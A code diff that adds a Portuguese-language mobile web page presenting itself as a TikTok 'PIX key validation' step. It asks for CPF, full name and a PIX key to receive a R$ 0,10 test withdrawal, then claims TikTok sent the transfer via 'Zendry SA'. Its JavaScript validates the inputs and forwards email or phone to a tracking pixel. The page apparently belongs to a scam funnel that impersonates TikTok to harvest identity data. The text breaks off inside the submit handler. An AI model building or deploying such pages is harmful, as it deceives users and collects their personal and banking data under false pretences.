@@ -1,0 +1,1209 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            background-color: #fff;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header */
+        .modal-header {
+            background: linear-gradient(135deg, #FE2C55 0%, #FF0050 100%);
+            padding: 15px 20px 12px 20px;
+            text-align: center;
+            color: #fff;
+            flex-shrink: 0;
+            position: relative;
+        }
+        
+        /* Badge */
+        .validation-badge {
+            width: 36px;
+            height: 36px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 8px auto;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        .validation-icon {
+            width: 18px;
+            height: 18px;
+            fill: #fff;
+        }
+
+        .header-title {
+            font-size: 15px;
+            font-weight: 800;
+            margin: 0;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            line-height: 1.2;
+        }
+
+        .modal-body {
+            flex: 1;
+            padding: 16px 20px 20px 20px;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+
+        .description-text {
+            font-size: 12px;
+            color: #545454;
+            text-align: center;
+            margin-bottom: 14px;
+            line-height: 1.35;
+            background: #F8F9FA;
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px dashed #D1D1D1;
+            font-weight: 500;
+        }
+
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            gap: 10px; /* Increased gap */
+            width: 100%;
+        }
+
+        .form-group {
+            margin: 0;
+        }
+
+        .field-label {
+            font-size: 12px;
+            font-weight: 700;
+            color: #333;
+            display: flex;
+            align-items: center;
+            margin-bottom: 4px;
+            gap: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+        
+        .field-label svg {
+            width: 13px;
+            height: 13px;
+            fill: #FE2C55;
+            opacity: 0.8;
+        }
+
+        /* Inputs - Increased size */
+        input[type="text"], input[type="tel"], input[type="email"] {
+            width: 100%;
+            height: 40px; /* Increased from 36px */
+            background: #F8F8F8;
+            border: 1px solid #E5E5E5;
+            border-radius: 8px;
+            padding: 0 12px;
+            font-size: 14px; /* Increased font size */
+            color: #161823;
+            outline: none;
+            transition: all 0.2s ease;
+            font-family: 'Inter', sans-serif;
+            font-weight: 500;
+        }
+
+        input:focus {
+            background: #fff;
+            border-color: #FE2C55;
+            box-shadow: 0 2px 8px rgba(254, 44, 85, 0.08);
+        }
+
+        /* Custom Select - Increased size */
+        .custom-select-wrapper {
+            position: relative;
+            user-select: none;
+        }
+        
+        .custom-select__trigger {
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 12px;
+            font-size: 14px; /* Increased font size */
+            font-weight: 500;
+            color: #161823;
+            height: 40px; /* Increased from 36px */
+            line-height: 40px;
+            background: #F8F8F8;
+            cursor: pointer;
+            border-radius: 8px;
+            border: 1px solid #E5E5E5;
+            transition: all 0.2s ease;
+        }
+
+        .custom-select.open .custom-select__trigger {
+            background: #fff;
+            border-color: #FE2C55;
+            border-radius: 8px 8px 0 0;
+            border-bottom: 1px solid #eee; /* Divider */
+        }
+        
+        .custom-options {
+            position: absolute;
+            display: block;
+            top: 100%;
+            left: 0;
+            right: 0;
+            border: 1px solid #FE2C55;
+            border-top: 0;
+            background: #fff;
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+            z-index: 100;
+            border-radius: 0 0 8px 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            max-height: 160px;
+            overflow-y: auto;
+            flex-direction: column; /* Ensure vertical stack if display flex were used */
+        }
+        
+        .custom-select.open .custom-options {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: all;
+        }
+        
+        .custom-option {
+            padding: 0 12px;
+            font-size: 13px;
+            font-weight: 500;
+            color: #161823;
+            line-height: 40px; /* Taller touch target */
+            cursor: pointer;
+            display: block; /* Force block to be full width and vertical */
+            border-bottom: 1px solid #E0E0E0; /* More visible separator */
+        }
+        
+        .custom-option:last-child {
+            border-bottom: none;
+        }
+        
+        .custom-option:hover {
+            background-color: #FFF0F2;
+            color: #FE2C55;
+        }
+        
+        .custom-option.selected {
+            color: #FE2C55;
+            background-color: rgba(254, 44, 85, 0.05);
+            font-weight: 600;
+        }
+
+        .arrow {
+            position: relative;
+            height: 7px;
+            width: 7px;
+            border-right: 2px solid #FE2C55;
+            border-bottom: 2px solid #FE2C55;
+            transform: rotate(45deg);
+            margin-bottom: 2px;
+            opacity: 0.7;
+        }
+
+        /* Button - Increased size */
+        .btn-obrigado {
+            width: 100%;
+            height: 46px; /* Increased from 42px */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 8px;
+            background: #FE2C55;
+            border: none;
+            cursor: pointer;
+            margin-top: auto;
+            transition: all 0.2s;
+            box-shadow: 0 4px 12px rgba(254, 44, 85, 0.25);
+            margin-top: 16px;
+        }
+
+        .btn-obrigado:active {
+            background: #E0264A;
+            transform: scale(0.98);
+        }
+
+        .btn-text {
+            color: #fff;
+            font-size: 15px; /* Increased font size */
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        
+        .btn-disabled {
+            background: #EBEBEB;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        
+        .btn-disabled .btn-text {
+            color: #A6A7AB;
+        }
+
+        input:disabled {
+            background-color: #F2F2F2;
+            color: #A6A7AB;
+            border-color: #E5E5E5;
+        }
+
+        /* Valid Field Style */
+        .valid-field input, .valid-field .custom-select__trigger {
+            border-color: #00C853 !important;
+            background-color: rgba(0, 200, 83, 0.03) !important;
+        }
+        
+        .valid-field .field-label {
+            color: #00C853;
+        }
+        
+        .valid-field .field-label svg {
+            fill: #00C853;
+        }
+
+        /* Loading Overlay */
+        #success-overlay {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.98);
+            z-index: 200;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(254, 44, 85, 0.1);
+            border-top: 4px solid #FE2C55;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 12px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .processing-text {
+            font-size: 15px;
+            font-weight: 600;
+            color: #161823;
+        }
+
+        /* Error state */
+        .input-error {
+            border-color: #FE2C55 !important;
+            background-color: rgba(254, 44, 85, 0.05) !important;
+            animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both;
+        }
+
+        @keyframes shake {
+            10%, 90% { transform: translate3d(-1px, 0, 0); }
+            20%, 80% { transform: translate3d(2px, 0, 0); }
+            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+            40%, 60% { transform: translate3d(4px, 0, 0); }
+        }
+        /* Confirmation Step Styling */
+        #confirmation-step {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+            background: #fff;
+        }
+
+        .header-success {
+            background: linear-gradient(135deg, #00C853 0%, #009624 100%);
+            padding: 15px 20px 12px 20px;
+            text-align: center;
+            color: #fff;
+            flex-shrink: 0;
+            position: relative;
+            box-shadow: none; /* Remove sombra para igualar ao original */
+        }
+
+        .header-icon-container {
+            width: 36px;
+            height: 36px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 8px auto;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            animation: pulse-green 2s infinite;
+        }
+
+        .header-icon-container svg {
+            width: 18px;
+            height: 18px;
+            fill: #fff;
+        }
+
+        @keyframes pulse-green {
+            0% { box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.4); }
+            70% { box-shadow: 0 0 0 6px rgba(255, 255, 255, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); }
+        }
+
+        .confirmation-body {
+            flex: 1;
+            padding: 16px 20px 20px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            /* Removemos justify-content: space-between para fluxo natural */
+            background: #fff; /* Fundo branco simples */
+            overflow-y: auto;
+        }
+
+        .confirmation-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            flex: 1; /* Ocupa espaço disponível empurrando botão para baixo */
+            padding-top: 12px; /* Reduzido para aproximar conteúdo do topo */
+        }
+
+        .pix-logo-large {
+            height: 40px;
+            margin-bottom: 16px;
+            opacity: 1;
+        }
+
+        .confirmation-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #161823;
+            margin: 0 0 12px 0;
+            line-height: 1.3;
+            text-align: center;
+        }
+
+        .confirmation-subtitle {
+            font-size: 14px;
+            color: #545454;
+            margin-bottom: 0;
+            line-height: 1.6;
+            text-align: center;
+            max-width: 300px;
+        }
+        
+        .confirmation-subtitle strong {
+            color: #00C853;
+            font-weight: 700;
+        }
+
+        .btn-confirm-pix {
+            width: 100%;
+            height: 46px; /* Igual ao original */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 8px;
+            background: #00C853;
+            border: none;
+            cursor: pointer;
+            margin-top: 16px; /* Reduzido para trazer o botão mais para cima */
+            transition: all 0.2s;
+            box-shadow: 0 4px 12px rgba(0, 200, 83, 0.25);
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            gap: 8px;
+        }
+
+        .btn-confirm-pix:active {
+            background: #009624;
+            transform: scale(0.98);
+        }
+        
+        .btn-confirm-icon {
+            width: 18px;
+            height: 18px;
+            fill: #fff;
+        }
+
+        /* Animação de Sucesso Final */
+        .success-animation {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.98);
+            z-index: 300;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .checkmark-circle {
+            width: 100px;
+            height: 100px;
+            background: #00C853;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 10px 40px rgba(0, 200, 83, 0.4);
+            animation: scaleIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            margin-bottom: 20px;
+        }
+
+        @keyframes scaleIn {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .checkmark {
+            width: 50px;
+            height: 50px;
+            stroke: #fff;
+            stroke-width: 4;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            stroke-dasharray: 50;
+            stroke-dashoffset: 50;
+            animation: drawCheck 0.5s ease 0.3s forwards;
+        }
+
+        @keyframes drawCheck {
+            to { stroke-dashoffset: 0; }
+        }
+
+        .success-message {
+            font-size: 18px;
+            font-weight: 700;
+            color: #161823;
+            text-align: center;
+            animation: slideUp 0.5s ease 0.5s both;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Main Step: Input Form -->
+    <div id="main-step" style="display: flex; flex-direction: column; height: 100%;">
+        <div class="modal-header">
+            <div class="validation-badge">
+                <svg class="validation-icon" viewBox="0 0 24 24">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"></path>
+                </svg>
+            </div>
+            <h1 class="header-title">VALIDAÇÃO CHAVE PIX</h1>
+        </div>
+
+        <div class="modal-body">
+            <p class="description-text">
+                Confirme seus dados para receber seu saque teste de <strong>R$ 0,10</strong> instantaneamente.
+            </p>
+
+            <form id="saque-form" class="form-container" novalidate="">
+                <div class="form-group">
+                    <label class="field-label" for="cpf-titular">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"></path></svg>
+                        CPF do Titular
+                    </label>
+                    <input type="tel" id="cpf-titular" name="cpf" placeholder="000.000.000-00" maxlength="14" required="">
+                </div>
+
+                <div class="form-group">
+                    <label class="field-label" for="nome">
+                        <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
+                        Nome Completo
+                    </label>
+                    <input type="text" id="nome" name="nome" placeholder="Digite seu nome completo" required="">
+                </div>
+
+                <div class="form-group">
+                    <label class="field-label">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"></path></svg>
+                        Tipo de Chave PIX
+                    </label>
+                    <div class="custom-select-wrapper">
+                        <div class="custom-select">
+                            <div class="custom-select__trigger">
+                                <span>Selecionar tipo</span>
+                                <div class="arrow"></div>
+                            </div>
+                            <div class="custom-options">
+                                <span class="custom-option" data-value="CPF">CPF</span>
+                                <span class="custom-option" data-value="Celular">Celular</span>
+                                <span class="custom-option" data-value="E-mail">E-mail</span>
+                            </div>
+                        </div>
+                    </div>
+                    <input type="hidden" id="tipo-chave" name="tipoChave">
+                </div>
+
+                <div class="form-group">
+                    <label class="field-label">
+                        <svg viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"></path></svg>
+                        Chave PIX
+                    </label>
+                    <input type="text" id="chave-pix" name="chavePix" placeholder="Preencha o tipo primeiro" disabled="" required="">
+                </div>
+            </form>
+
+            <button type="submit" form="saque-form" id="btn-enviar" class="btn-obrigado btn-disabled">
+                <span class="btn-text">Validar Dados</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- Confirmation Step -->
+    <div id="confirmation-step">
+        <div class="modal-header header-success">
+            <div class="header-icon-container">
+                <svg viewBox="0 0 24 24">
+                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"></path>
+                </svg>
+            </div>
+            <h1 class="header-title">PIX ENVIADO!</h1>
+        </div>
+        
+        <div class="modal-body confirmation-body">
+            
+            <div class="confirmation-content">
+                <h2 class="confirmation-title">Verifique seu banco</h2>
+                <img src="images/pix-logo.svg" alt="PIX" class="pix-logo-large">
+                <p class="confirmation-subtitle">A transferência foi enviada com sucesso pelo TikTok em nome de <strong>"Zendry SA"</strong>.<br><br>Confirme o recebimento para validar sua chave.</p>
+            </div>
+            
+            <button type="button" id="btn-confirm-pix" class="btn-confirm-pix">
+                <span class="btn-text">JÁ RECEBI O PIX</span>
+                <svg class="btn-confirm-icon" viewBox="0 0 24 24">
+                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"></path>
+                </svg>
+            </button>
+        </div>
+    </div>
+
+    <!-- Success Overlay/Animation -->
+    <div id="final-success-animation" class="success-animation">
+        <div class="checkmark-circle">
+            <svg class="checkmark" viewBox="0 0 24 24">
+                <polyline points="20 6 9 17 4 12"></polyline>
+            </svg>
+        </div>
+        <div class="success-message">Chave validada com sucesso!</div>
+    </div>
+
+    <div id="success-overlay">
+        <div class="spinner"></div>
+        <p class="processing-text">Validando chave PIX...</p>
+    </div>
+
+    <script>
+        // --- Helpers ---
+        function formatCPF(v) {
+            v = v.replace(/\D/g, "");
+            if (v.length > 11) v = v.slice(0, 11);
+            return v.replace(/(\d{3})(\d)/, "$1.$2")
+                    .replace(/(\d{3})(\d)/, "$1.$2")
+                    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+        }
+
+        function validateCPF(cpf) {
+            cpf = cpf.replace(/[^\d]+/g, '');
+            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+            let soma = 0, resto;
+            for (let i = 1; i <= 9; i++) soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+            resto = (soma * 10) % 11;
+            if ((resto === 10) || (resto === 11)) resto = 0;
+            if (resto !== parseInt(cpf.substring(9, 10))) return false;
+            soma = 0;
+            for (let i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+            resto = (soma * 10) % 11;
+            if ((resto === 10) || (resto === 11)) resto = 0;
+            return resto === parseInt(cpf.substring(10, 11));
+        }
+
+        function formatPhone(v) {
+            v = v.replace(/\D/g, "");
+            if (v.length > 11) v = v.slice(0, 11);
+            if (v.length > 10) return v.replace(/^(\d\d)(\d{5})(\d{4}).*/, "($1) $2-$3");
+            if (v.length > 6) return v.replace(/^(\d\d)(\d{4})(\d{0,4}).*/, "($1) $2-$3");
+            if (v.length > 2) return v.replace(/^(\d\d)(\d{0,5})/, "($1) $2");
+            return v.replace(/^(\d*)/, "($1");
+        }
+
+        function validateEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        function validateRandomKey(key) {
+             return /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/.test(key);
+        }
+
+        // --- Security Functions (Cookie Management) ---
+        
+        // Função para criar hash SHA256 da chave PIX (para privacidade)
+        async function hashPixKey(pixKey) {
+            const encoder = new TextEncoder();
+            const data = encoder.encode(pixKey.toLowerCase().trim());
+            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+            return hashHex;
+        }
+        
+        // Função para salvar cookie de validação PIX
+        function setCookie(name, value, days) {
+            const date = new Date();
+            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+            const expires = "expires=" + date.toUTCString();
+            document.cookie = name + "=" + value + ";" + expires + ";path=/;SameSite=Strict";
+        }
+        
+        // Função para ler cookie
+        function getCookie(name) {
+            const nameEQ = name + "=";
+            const cookies = document.cookie.split(';');
+            for (let i = 0; i < cookies.length; i++) {
+                let c = cookies[i];
+                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+            }
+            return null;
+        }
+        
+        // Função para salvar cookie após validação bem-sucedida
+        async function savePixValidatedCookie(chavePix) {
+            try {
+                const hash = await hashPixKey(chavePix);
+                setCookie('pix_validated', hash, 365); // Cookie válido por 1 ano
+                console.log('Cookie de validação PIX salvo com sucesso');
+            } catch (e) {
+                console.error('Erro ao salvar cookie de validação:', e);
+            }
+        }
+        
+        // Função para verificar se a chave PIX já foi validada
+        async function checkPixAlreadyUsed(chavePix) {
+            try {
+                const cookieHash = getCookie('pix_validated');
+                if (!cookieHash) return false;
+                
+                const currentHash = await hashPixKey(chavePix);
+                return cookieHash === currentHash;
+            } catch (e) {
+                console.error('Erro ao verificar cookie:', e);
+                return false;
+            }
+        }
+        
+        // Função para mostrar mensagem de chave já validada
+        function showPixAlreadyValidatedMessage() {
+            // Adiciona mensagem visual abaixo do campo de chave PIX
+            const chavePixGroup = chavePixInput.parentElement;
+            
+            // Remove mensagem anterior se existir
+            const existingMsg = document.getElementById('pix-already-validated-msg');
+            if (existingMsg) existingMsg.remove();
+            
+            // Cria nova mensagem
+            const msgDiv = document.createElement('div');
+            msgDiv.id = 'pix-already-validated-msg';
+            msgDiv.style.cssText = `
+                background: #FFF3CD;
+                border: 1px solid #FFC107;
+                color: #856404;
+                padding: 10px;
+                border-radius: 8px;
+                font-size: 12px;
+                font-weight: 600;
+                margin-top: 8px;
+                text-align: center;
+            `;
+            msgDiv.textContent = '⚠️ Chave PIX já está validada. Você pode prosseguir para a próxima etapa.';
+            
+            chavePixGroup.appendChild(msgDiv);
+            
+            // Modifica o botão para permitir avançar sem enviar novo saque
+            btnEnviar.classList.remove('btn-disabled');
+            btnEnviar.innerHTML = '<span class="btn-text">Prosseguir</span>';
+            
+            // Adiciona classe visual ao campo
+            chavePixInput.style.borderColor = '#FFC107';
+            chavePixInput.style.backgroundColor = 'rgba(255, 193, 7, 0.05)';
+        }
+
+        // --- DOM Elements ---
+        const form = document.getElementById('saque-form');
+        const cpfInput = document.getElementById('cpf-titular');
+        const nomeInput = document.getElementById('nome');
+        const tipoChaveInput = document.getElementById('tipo-chave');
+        const chavePixInput = document.getElementById('chave-pix');
+        const btnEnviar = document.getElementById('btn-enviar');
+        const successOverlay = document.getElementById('success-overlay');
+        const mainStep = document.getElementById('main-step');
+        const confirmationStep = document.getElementById('confirmation-step');
+        const finalSuccessAnimation = document.getElementById('final-success-animation');
+        const btnConfirmPix = document.getElementById('btn-confirm-pix');
+        
+        let storedFormData = null;
+        let storedPaymentData = null;
+        let pixAlreadyValidated = false; // Flag para controle de validação prévia
+        
+        // --- Verificação Preventiva ao Carregar Página ---
+        window.addEventListener('DOMContentLoaded', function() {
+            const pixCookie = getCookie('pix_validated');
+            if (pixCookie) {
+                console.log('Cookie de validação PIX detectado ao carregar página');
+                showPixAlreadyValidatedMessage();
+                pixAlreadyValidated = true;
+            }
+        });
+        
+        // Custom Select Logic
+        const selectWrapper = document.querySelector('.custom-select');
+        const selectTrigger = document.querySelector('.custom-select__trigger');
+        const customOptions = document.querySelectorAll('.custom-option');
+
+        selectTrigger.addEventListener('click', () => {
+            selectWrapper.classList.toggle('open');
+        });
+
+        for (const option of customOptions) {
+            option.addEventListener('click', function() {
+                if (!this.classList.contains('selected')) {
+                    const value = this.getAttribute('data-value');
+                    
+                    // Update visual selection
+                    selectTrigger.querySelector('span').textContent = value;
+                    selectTrigger.querySelector('span').style.color = "#161823";
+                    document.querySelectorAll('.custom-option').forEach(el => el.classList.remove('selected'));
+                    this.classList.add('selected');
+                    selectWrapper.classList.remove('open');
+                    
+                    // Update hidden input
+                    tipoChaveInput.value = value;
+                    
+                    // Logic: Enable input and handle "CPF" type
+                    chavePixInput.disabled = false;
+                    chavePixInput.value = ""; // Reset value on type change
+                    
+                    if (value === 'CPF') {
+                        chavePixInput.placeholder = "000.000.000-00";
+                        if (cpfInput.value) {
+                            chavePixInput.value = cpfInput.value;
+                        }
+                    } else if (value === 'Celular') {
+                        chavePixInput.placeholder = "(00) 00000-0000";
+                    } else if (value === 'E-mail') {
+                        chavePixInput.placeholder = "exemplo@email.com";
+                    } else {
+                        chavePixInput.placeholder = "Chave aleatória";
+                    }
+                    
+                    if (!chavePixInput.value) {
+                        chavePixInput.focus();
+                    }
+                    
+                    checkFormValidity();
+                }
+            });
+        }
+
+        window.addEventListener('click', function(e) {
+            if (!document.querySelector('.custom-select').contains(e.target)) {
+                selectWrapper.classList.remove('open');
+            }
+        });
+
+        // --- Event Listeners ---
+        
+        cpfInput.addEventListener('input', function() {
+            this.value = formatCPF(this.value);
+            this.classList.remove('input-error');
+            
+            // Visual validation feedback
+            const clean = this.value.replace(/\D/g, "");
+            if (validateCPF(clean)) {
+                this.parentElement.classList.add('valid-field');
+            } else {
+                this.parentElement.classList.remove('valid-field');
+            }
+
+            if (tipoChaveInput.value === 'CPF') {
+                chavePixInput.value = this.value;
+            }
+            
+            checkFormValidity();
+        });
+
+        nomeInput.addEventListener('input', function() {
+            this.classList.remove('input-error');
+            if (this.value.trim().length > 3) {
+                 this.parentElement.classList.add('valid-field');
+            } else {
+                 this.parentElement.classList.remove('valid-field');
+            }
+            checkFormValidity();
+        });
+        
+        chavePixInput.addEventListener('input', function() {
+            this.classList.remove('input-error');
+            const type = tipoChaveInput.value;
+            
+            if (type === 'CPF') {
+                this.value = formatCPF(this.value);
+            } else if (type === 'Celular') {
+                this.value = formatPhone(this.value);
+            }
+            
+            checkFormValidity();
+        });
+
+        function checkFormValidity() {
+            const nomeValid = nomeInput.value.trim().length > 2;
+            const cpfClean = cpfInput.value.replace(/\D/g, "");
+            const cpfValid = validateCPF(cpfClean);
+            const typeSelected = tipoChaveInput.value !== "";
+            
+            let keyValid = false;
+            const key = chavePixInput.value.trim();
+            
+            if (typeSelected && key.length > 0) {
+                switch(tipoChaveInput.value) {
+                    case 'CPF':
+                        keyValid = validateCPF(key.replace(/\D/g, ""));
+                        break;
+                    case 'E-mail':
+                        keyValid = validateEmail(key);
+                        break;
+                    case 'Celular':
+                        const phoneClean = key.replace(/\D/g, "");
+                        keyValid = phoneClean.length >= 10 && phoneClean.length <= 11;
+                        break;
+                    case 'Chave Aleatória':
+                        keyValid = validateRandomKey(key);
+                        break;
+                    default:
+                        keyValid = key.length > 3;
+                }
+            }
+            
+            // Visual feedback for key field
+            if (keyValid) {
+                 chavePixInput.parentElement.classList.add('valid-field');
+            } else {
+                 chavePixInput.parentElement.classList.remove('valid-field');
+            }
+
+            if (nomeValid && cpfValid && typeSelected && keyValid) {
+                btnEnviar.classList.remove('btn-disabled');
+                return true;
+            } else {
+                btnEnviar.classList.add('btn-disabled');
+                return false;
+            }
+        }
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const cpfClean = cpfInput.value.replace(/\D/g, "");
+            if (!validateCPF(cpfClean)) {
+                cpfInput.classList.add('input-error');
+                return;
+            }
+
+            if (nomeInput.value.trim().length < 3) {
+                nomeInput.classList.add('input-error');
+                return;
+            }
+
+            if (!checkFormValidity()) return;
+
+            // Prepara dados do formulário
+            let chavePix = chavePixInput.value.trim();
+            
+            // Limpa formatação para CPF e Celular (mantém apenas números)
+            if (tipoChaveInput.value === 'CPF' || tipoChaveInput.value === 'Celular') {
+                chavePix = chavePix.replace(/\D/g, "");
+            }
+            
+            // VALIDAÇÃO DE SEGURANÇA: Verifica se a chave PIX já foi validada (cookie)
+            if (pixAlreadyValidated) {
+                // Usuário já validou antes, permite prosseguir sem novo saque
+                console.log('Chave PIX já validada anteriormente (cookie). Prosseguindo sem novo saque.');
+                
+                const message = {
+                    type: 'PIX_CONFIRMED',
+                    skipPayment: true,
+                    alreadyValidated: true
+                };
+                
+                if (window.parent && window.parent !== window) {
+                    window.parent.postMessage(message, '*');
+                } else {
+                    if (typeof window.showScreen === "function") {
+                        window.showScreen('seven');
+                    } else {
+                        location.hash = '#seven';
+                    }
+                }
+                return;
+            }
+            
+            // Verifica cookie antes de enviar ao backend
+            const pixAlreadyUsed = await checkPixAlreadyUsed(chavePix);
+            if (pixAlreadyUsed) {
+                console.log('Chave PIX já validada (verificação por hash). Prosseguindo sem novo saque.');
+                
+                const message = {
+                    type: 'PIX_CONFIRMED',
+                    skipPayment: true,
+                    alreadyValidated: true
+                };
+                
+                if (window.parent && window.parent !== window) {
+                    window.parent.postMessage(message, '*');
+                } else {
+                    if (typeof window.showScreen === "function") {
+                        window.showScreen('seven');
+                    } else {
+                        location.hash = '#seven';
+                    }
+                }
+                return;
+            }
+
+            btnEnviar.classList.add('btn-disabled');
+            btnEnviar.innerHTML = '<span class="btn-text">Validando...</span>';
+            successOverlay.style.display = 'flex';
+            
+            const formData = {
+                nome: nomeInput.value.trim(),
+                cpf: cpfInput.value.replace(/\D/g, ""),
+                tipoChave: tipoChaveInput.value,
+                chavePix: chavePix
+            };
+
+            // === TIKTOK ENHANCED MATCH ===
+            // Envia dados do usuário para TikTok Pixel para melhorar match de conversões
+            try {
+                if (typeof ttq !== 'undefined' && typeof ttq.identify === 'function') {
+                    const identifyData = {};
+                    
+                    // Se a chave PIX for email, envia para TikTok
+                    if (formData.tipoChave === 'Email' || formData.tipoChave === 'E-mail') {
+                        identifyData.email = formData.chavePix;
+                        console.log('🎯 TikTok Enhanced Match: Email identificado');
+                    }
+                    
+                    // Se a chave PIX for telefone, envia para TikTok
+                    if (formData.tipoChave === 'Celular') {
+                        identifyData.phone_number = formData.chavePix;
+                        console.log('🎯 TikTok Enhanced Match: Telefone identificado');
+                    }
+                    
+                    // Se temos dados para enviar, faz identify
+                    if (Object.keys(identifyData).length > 0) {
+                        ttq.identify(identifyData);
+                        console.log('✅ TikTok Enhanced Match aplicado:', identifyData);
+                    }
+                }
+            } catch (error) {
+                console.error('❌ Erro ao aplicar TikTok Enhanced Match:', error);
+            }
